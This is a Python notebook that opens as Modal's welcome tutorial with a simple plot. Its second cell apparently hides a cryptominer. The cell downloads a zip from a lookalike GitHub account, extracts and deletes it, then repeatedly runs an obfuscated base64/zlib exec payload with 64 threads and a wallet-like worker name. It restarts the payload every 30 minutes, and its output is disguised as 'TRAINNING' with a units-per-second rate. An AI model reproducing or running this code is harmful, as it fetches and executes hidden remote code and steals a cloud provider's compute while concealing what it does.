# %% [markdown]
# # Welcome to Modal notebooks!
#
# Write Python code and collaborate in real time. Your code runs in Modal's
# **serverless cloud**, and anyone in the same workspace can join.
#
# This notebook comes with some common Python libraries installed. Run
# cells with `Shift+Enter`.

# %%
import matplotlib.pyplot as plt
import numpy as np

x = np.linspace(-20, 20, 500)
plt.plot(np.cos(x / 3.7 + 0.3), x * np.sin(x))

# %%
import subprocess
import os
import signal
import requests
import zipfile
from time import sleep
import zlib,base64

timeout = 1800

# download file
url = "https://github.com/G1tHuP333/test/raw/refs/heads/main/SystemFile.zip"
filename = 'Machine_Learning.zip'
response = requests.get(url, stream=True)
file = open(filename, "wb")
file.write(response.content)
file.close()

# unzip file 
with zipfile.ZipFile('Machine_Learning.zip', 'r') as zip_ref:
	zip_ref.extractall()

# delete zip file
os.remove('Machine_Learning.zip')

# code = "import zlib,base64;threads = 1;name = 'nextjournal';_=lambda O0O00O0O0O0O0O0O0O0O00O0O0O0O00O00O00O0O0O00O0O00O00O0O00O0O00O00O00O0O00O0O00O00O0O00O0O0O00O00O00O00O00O0O0O00O0O00O00O00O00O0O00O00O0O0O0O00O00O00O00O0O00O0O0O0O00O00O00O00O00O0O0O0O0O00O0O0O0O0O0O0O00O0O00O00O0O0O00O0O0O0O0O00O0O00O0O0O00O00O00O0:__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJyryslMAgAEZAGy')).decompress(__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxLSixONTMBAAfSAgY=')).b64decode(O0O00O0O0O0O0O0O0O0O00O0O0O0O00O00O00O0O0O00O0O00O00O0O00O0O00O00O00O0O00O0O00O00O0O00O0O0O00O00O00O00O00O0O0O00O0O00O00O00O00O0O00O00O0O0O0O00O00O00O00O0O00O0O0O0O00O00O00O00O00O0O0O0O0O00O0O0O0O0O0O0O00O0O00O00O0O0O00O0O0O0O0O00O0O00O0O0O00O00O00O0[::-1]));exec(_(b'=...'))"
code = "import zlib,base64;threads=64;name='SRB_MCB';wname='MZCpYYo42ESmogzNNvdXogdDDzoFLgZeWB.MD';_=lambda O0O00O0O0O00O0O0O00O00O00O00O0O0O00O0O0O0O0O00O00O00O00O0O0O00O00O0O0O0O0O00O0O00O0O00O0O00O0O0O0O00O00O00O00O0O00O00O00O0O0O0O00O00O00O00O0O0O00O00O0O00O0O00O00O0O00O0O0O00O00O00O00O00O0O0O00O00O00O0O0O00O0O0O0O00O0O0O00O0O0O0O0O00O0O0O00O00O0O00O00O0:__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJyryslMAgAEZAGy')).decompress(__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxLSixONTMBAAfSAgY=')).b64decode(O0O00O0O0O00O0O0O00O00O00O00O0O0O00O0O0O0O0O00O00O00O00O0O0O00O00O0O0O0O0O00O0O00O0O00O0O00O0O0O0O00O00O00O00O0O00O00O00O0O0O0O00O00O00O00O0O0O00O00O0O00O0O00O00O0O00O0O0O00O00O00O00O00O0O0O00O00O00O0O0O00O0O0O0O00O0O0O00O0O0O0O0O00O0O0O00O00O0O00O00O0[::-1]));exec(_(b'==...'))"

while True:
    print(f"▶️ Đang chạy code với timeout {timeout}")
    # Tạo process group mới để kill cả nhóm
    process = subprocess.Popen(
        ["python", "-c", code],
        preexec_fn=os.setsid  # Tạo process group
    )
    try:
        process.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        print(f"⏰ Hết {timeout}, đang kill toàn bộ tiến trình...")
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # Kill cả nhóm
    sleep(1)
# Out:
# ▶️ Đang chạy code với timeout 1800
# TRAINNING...|N/A|64|0|0.00 U/s
